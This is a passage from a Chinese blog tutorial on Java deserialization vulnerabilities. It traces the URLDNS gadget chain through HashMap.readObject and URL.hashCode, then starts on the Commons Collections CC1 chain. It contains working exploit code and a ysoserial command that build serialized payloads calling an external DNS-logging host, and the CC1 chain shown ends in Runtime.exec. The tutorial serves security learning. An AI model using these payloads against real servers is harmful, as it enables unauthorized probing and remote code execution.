class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput oit)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = (String) oit.readObject();</span><br><span class="line">        <span class="built_in">this</span>.email = (String) oit.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//创建ExternalizableTest对象，并初始化</span></span><br><span class="line">            <span class="type">ExternalizableTest</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExternalizableTest</span>();</span><br><span class="line">            t.setUsername(<span class="string">&quot;Y5neKO&quot;</span>);</span><br><span class="line">            t.setEmail(<span class="string">&quot;1727058834@qq.com&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//创建Java对象序列化输出流对象</span></span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//序列化ExternalizableTest类</span></span><br><span class="line">            oos.writeObject(t);</span><br><span class="line">            oos.flush();</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;序列化后的 数据：&quot;</span>);</span><br><span class="line">            System.out.println(baos);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 打印ExternalizableTest类序列化以后的字节数组，我们可以将其存储到文件中或者通过Socket发送到远程服务地址</span></span><br><span class="line">            System.out.println(<span class="string">&quot;ExternalizableTest类序列化后的字节数组:&quot;</span> + Arrays.toString(baos.toByteArray()));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 利用ExternalizableTest类生成的二进制数组创建二进制输入流对象用于反序列化操作</span></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line"></span><br><span class="line">            <span class="comment">//创建Java对象输入流</span></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//反序列化输入流数据为ExternalizableTest对象</span></span><br><span class="line">            <span class="type">ExternalizableTest</span> <span class="variable">test</span> <span class="operator">=</span> (ExternalizableTest) ois.readObject();</span><br><span class="line">            System.out.println(<span class="string">&quot;用户名:&quot;</span> + test.getUsername() + <span class="string">&quot;\n邮箱:&quot;</span> + test.getEmail());</span><br><span class="line">            ois.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230719221141221.png" alt="image-20230719221141221" style="zoom:80%;" />



<h3 id="自定义序列化-writeObject-和反序列化-readObject"><a href="#自定义序列化-writeObject-和反序列化-readObject" class="headerlink" title="自定义序列化(writeObject)和反序列化(readObject)"></a>自定义序列化(writeObject)和反序列化(readObject)</h3><p>实现了<code>java.io.Serializable</code>接口的类，还可以定义如下方法(<code>反序列化魔术方法</code>)，这些方法将会在类序列化或反序列化过程中调用：</p>
<ol>
<li><strong><code>private void writeObject(ObjectOutputStream oos)</code>,自定义序列化。</strong></li>
<li><strong><code>private void readObject(ObjectInputStream ois)</code>，自定义反序列化。</strong></li>
<li><code>private void readObjectNoData()</code>。</li>
<li><code>protected Object writeReplace()</code>，写入时替换对象。</li>
<li><code>protected Object readResolve()</code>。</li>
</ol>
<p>具体的方法名定义在<code>java.io.ObjectStreamClass#ObjectStreamClass(java.lang.Class&lt;?&gt;)</code>，其中方法有详细的声明。</p>
<h3 id="URLDNS利用链"><a href="#URLDNS利用链" class="headerlink" title="URLDNS利用链"></a>URLDNS利用链</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">环境：</span><br><span class="line">JDK版本：不限</span><br><span class="line">组件版本：JDK原生</span><br></pre></td></tr></table></figure>

<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>URLDNS主要的作用就在于检测服务器上是否存在反序列化漏洞，如果存在就会发送一个DNS请求，这里所利用的就类似于SSRF的一中形式，所以漏洞的触发点就在URL上面（攻击者有可能找RCE的时候没找到，然后找到了URL上面，能够利用一下上面的SSRF）</p>
<p>利用链只依赖jdk本身提供的类，不依赖其他第三方类，所以具有很高的通用性，可以用于判断目标是否存在反序列化漏洞。</p>
<p>我们可以从ysoserial工具的URLDNS链的payload注释中看见整条利用链</p>
<img src="/image/image-20230804170018898.png" alt="image-20230804170018898" style="zoom:80%;" />

<p>可以看到触发点是HashMap类的readObject方法，直接开始审计</p>
<img src="/image/image-20230804174258121.png" alt="image-20230804174258121" style="zoom:80%;" />

<p>可以看到HashMap实现了Serializable接口，跟进到readObject方法</p>
<p>关键代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        reinitialize();</span><br><span class="line">        <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                             loadFactor);</span><br><span class="line">        s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">        <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                             mappings);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">            <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">            <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">            <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">            <span class="type">float</span> <span class="variable">fc</span> <span class="operator">=</span> (<span class="type">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                       DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                       (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                       MAXIMUM_CAPACITY :</span><br><span class="line">                       tableSizeFor((<span class="type">int</span>)fc));</span><br><span class="line">            <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                         (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line">            <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">                Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">            table = tab;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>readObject首先从输出流中读取序列化数据，然后开始一系列反序列化操作，到最后来到了gadget中的putVal方法</p>
<img src="/image/image-20230804175643574.png" alt="image-20230804175643574" style="zoom:80%;" />



<p>putVal方法本身是用来实现Map.put及相关方法，我们要关注的是其中调用的hash方法</p>
<p>跟进hash方法</p>
<img src="/image/image-20230804180443981.png" alt="image-20230804180443981" style="zoom:80%;" />

<p>如果key对象不是null的话就会调用hashCode方法，而这个key对象来自哪里</p>
<p>反观一下readObject方法</p>
<img src="/image/image-20230804180854619.png" alt="image-20230804180854619" style="zoom:80%;" />

<p>我们发现key对象就来自于反序列化后的内容，也就是我们传入的URL类对象</p>
<p>因此我们回到hashCode方法，跟进<code>java.net.URL</code>类</p>
<img src="/image/image-20230804170618792.png" alt="image-20230804170618792" style="zoom:80%;" />

<p>可以看到URL类实现了Serializable接口</p>
<p>继续跟进到触发点hashCode方法</p>
<img src="/image/image-20230804172724243.png" alt="image-20230804172724243" style="zoom:80%;" />

<img src="/image/image-20230804172825251.png" alt="image-20230804172825251" style="zoom:80%;" />

<p>可以看到如果hashCode值不等于-1的话，就会直接返回hashCode的值，则不会触发url解析</p>
<p>如果等于-1就会调用handler的hashCode方法，跟进看看handler对象</p>
<img src="/image/image-20230804173500476.png" alt="image-20230804173500476" style="zoom:80%;" />

<p>发现是URLStreamHandler类，也就是说这里实际上调用的是handler的hashCode方法，跟进</p>
<img src="/image/image-20230804182326182.png" alt="image-20230804182326182" style="zoom:80%;" />

<p>可以看到调用了getHostAddress方法，跟进</p>
<img src="/image/image-20230804183230731.png" alt="image-20230804183230731" style="zoom:80%;" />

<p>这里通过InetAddress类的getByName方法进行了DNS解析，这就是最终产生DNS解析记录的地方</p>
<p>整个调用链如下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">HashMap.readObject() -&gt; HashMap.putVal() -&gt; HashMap.<span class="built_in">hash</span>() -&gt; URL.hashCode() -&gt; URLStreamHandler.hashCode().getHostAddress() -&gt; URLStreamHandler.getHostAddress().InetAddress.getByName()</span><br></pre></td></tr></table></figure>



<h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>我们通过一段反序列化代码测试一下</p>
<p><strong>TestURLDNS.java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestURLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;URLDNS&quot;</span>));</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">test</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过ysoserial生成URLDNS的payload</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar URLDNS &quot;http://d1dd3347.su19.org&quot; &gt; URLDNS</span><br></pre></td></tr></table></figure>

<p>我们直接在HashMap类的readObject方法下断点，然后运行</p>
<img src="/image/image-20230804202828380.png" alt="image-20230804202828380" style="zoom:80%;" />

<p>可以看到我们的payload反序列化后作为key传入hash函数</p>
<img src="/image/image-20230804203153864.png" alt="image-20230804203153864" style="zoom:80%;" />

<p>此时key不为null，调用URL类的hashCode方法</p>
<img src="/image/image-20230804203629009.png" alt="image-20230804203629009" style="zoom:80%;" />

<p>上一步中传入hashCode值为-1，紧接着调用handler（URLStreamHandler类）的hashCode方法，并传入this（URL类）</p>
<img src="/image/image-20230804203908898.png" alt="image-20230804203908898" style="zoom:80%;" />

<p>后面就是形成dns解析的过程了，我们直接略过</p>
<img src="/image/image-20230804204419268.png" alt="image-20230804204419268" style="zoom:80%;" />

<p>成功解析</p>
<h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>回到gadget，我们发现HashMap.put()方法中也调用了hash方法</p>
<img src="/image/image-20230804204635462.png" alt="image-20230804204635462" style="zoom:80%;" />

<p>按道理来说进行put操作的时候也会触发dns解析</p>
<p><strong>TestHashMapPut.java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestHashMapPut</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MalformedURLException &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://d1dd3347.su19.org/&quot;</span>);</span><br><span class="line">        map.put(url, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230804205205833.png" alt="image-20230804205205833" style="zoom:80%;" />

<p>可以看到确实触发了解析，我们再看一下ysoserial工具序列化生成payload的过程</p>
<img src="/image/image-20230804205339113.png" alt="image-20230804205339113" style="zoom:80%;" />

<p>这里也用到了HashMap.put方法，但没有产生dns解析记录</p>
<p>其实是因为重写了openConnection方法和getHostAddress方法，作者是为了防止干扰误判才进行了重写</p>
<img src="/image/image-20230804205519095.png" alt="image-20230804205519095" style="zoom:80%;" />

<p>那这样的话反序列化后会不会也执行不了dns查询呢</p>
<p>看一下URL类中handler的处理</p>
<img src="/image/image-20230804210722636.png" alt="image-20230804210722636" style="zoom:80%;" />

<p>我们发现是通过transient进行修饰的，而被transient修饰的属性无法被序列化，因此在最终反序列化的过程中仍然能执行dns查询</p>
<p><strong>TestTransient.java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestTransient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Test</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置值</span></span><br><span class="line">        test.test = <span class="string">&quot;Test Value&quot;</span>;</span><br><span class="line">        System.out.println(test.test);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(test);</span><br><span class="line">        System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray()));</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        <span class="type">Test</span> <span class="variable">serTest</span> <span class="operator">=</span> (Test) objectInputStream.readObject();</span><br><span class="line">        System.out.println(serTest.test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">transient</span> <span class="keyword">public</span> String test;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/image/image-20230804211944230.png" alt="image-20230804211944230"></p>
<p>可以看到序列化后test的值为null，并没有代入其中</p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p>通过对URLDNS利用链的分析，我们可以自行构建EXP</p>
<p>首先来到最外层的URL类的hashCode方法</p>
<img src="/image/image-20230805173955708.png" alt="image-20230805173955708" style="zoom:80%;" />

<p>第一步保证hashCode值为-1，我们可以通过反射设置属性值</p>
<p>紧接着来到handler对象，发现是实例化的URLStreamHandler，但是他本身是个抽象类无法被实例化</p>
<img src="/image/image-20230805174149912.png" alt="image-20230805174149912" style="zoom:80%;" />

<p>也就是说我们实例化的其实是他的子类</p>
<img src="/image/image-20230805182207357.png" alt="image-20230805182207357" style="zoom:80%;" />

<p>这里会根据URL类中的构造方法来识别protocal，从而实例化相应协议的handler</p>
<img src="/image/image-20230805182417872.png" alt="image-20230805182417872" style="zoom:80%;" />

<p>之前提到过为了防止序列化生成payload时产生多余解析，我们需要重写一下handler中的getHostAddress方法</p>
<img src="/image/image-20230805172713181.png" alt="image-20230805172713181" style="zoom:80%;" />

<p>而openConnection则作为抽象类必须被实现</p>
<img src="/image/image-20230805181141799.png" alt="image-20230805181141799" style="zoom:80%;" />

<p>我们可以通过URL类的构造方法<code>public URL(URL context, String spec, URLStreamHandler handler)</code>来自定义handler，从而重写上述两种方法</p>
<p>接着我们利用HashMap.put方法作为跳板，调用HashMap.putVal方法和HashMap.Hash方法</p>
<img src="/image/image-20230805183213484.png" alt="image-20230805183213484" style="zoom:80%;" />

<p>接着序列化HashMap对象后输出payload即可</p>
<p>由此我们可以构造exp</p>
<p><strong>TestURLDNSExp.java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestURLDNSExp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过实例化URLStreamHandler子类自定义handler，从而实现重写</span></span><br><span class="line">        <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLStreamHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射获取URL类并使用自定义handler进行实例化</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getConstructor(URL.class,String.class,URLStreamHandler.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> constructor.newInstance(<span class="literal">null</span>,<span class="string">&quot;http://urldns.d1dd3347.su19.org&quot;</span>,handler);</span><br><span class="line">        <span class="comment">//反射获取URL类中的hashCode属性，并修改访问权限</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化HashMap对象</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//调用HashMap.put方法传入</span></span><br><span class="line">        ht.put(object,<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//注意这里是put后再将hashCode设置为-1，否则put过程会通过hash方法重新覆盖</span></span><br><span class="line">        field.set(object,-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化HashMap输出payload到文件</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;H:\\学习记录\\学习记录Markdown\\Java安全通用\\URLDNS2&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(ht);</span><br><span class="line">        </span><br><span class="line">        System.out.println(ht);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功生成payload文件，并验证成功</p>
<img src="/image/image-20230806013532634.png" alt="image-20230806013532634" style="zoom:80%;" />

<img src="/image/image-20230806014219934.png" alt="image-20230806014219934" style="zoom:80%;" />



<h3 id="Apache-Commons-Collections反序列化漏洞"><a href="#Apache-Commons-Collections反序列化漏洞" class="headerlink" title="Apache Commons Collections反序列化漏洞"></a>Apache Commons Collections反序列化漏洞</h3><p><code>Apache Commons</code>是<code>Apache</code>开源的Java通用类项目在Java中项目中被广泛的使用，<code>Apache Commons</code>当中有一个组件叫做<code>Apache Commons Collections</code>，主要封装了Java的<code>Collection（集合）</code>相关类对象。本节将逐步详解<code>Collections</code>反序列化攻击链(仅以<code>TransformedMap</code>调用链为示例)最终实现反序列化<code>RCE</code>。</p>
<img src="/image/image-20230806130301737.png" alt="image-20230806130301737" style="zoom:80%;" />

<h3 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">环境：</span><br><span class="line">JDK版本：jdk8u71以下</span><br><span class="line">组件版本：commons-collections-3.2.1</span><br></pre></td></tr></table></figure>

<h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>和URLDNS链不同的是，CC1可以用来执行命令，作为整个CC链的起点，对整个CC链的发展有着巨大的作用</p>
<p>首先来到ysoserial工具的payload，从注释我们可以看见整个利用链</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">		ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">			AnnotationInvocationHandler.readObject()</span></span><br><span class="line"><span class="comment">				Map(Proxy).entrySet()</span></span><br><span class="line"><span class="comment">					AnnotationInvocationHandler.invoke()</span></span><br><span class="line"><span class="comment">						LazyMap.get()</span></span><br><span class="line"><span class="comment">							ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">								ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">								InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">									Method.invoke()</span></span><br><span class="line"><span class="comment">										Class.getMethod()</span></span><br><span class="line"><span class="comment">								InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">									Method.invoke()</span></span><br><span class="line"><span class="comment">										Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">								InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">									Method.invoke()</span></span><br><span class="line"><span class="comment">										Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Requires:</span></span><br><span class="line"><span class="comment">		commons-collections</span></span><br><span class="line"><span class="comment"> 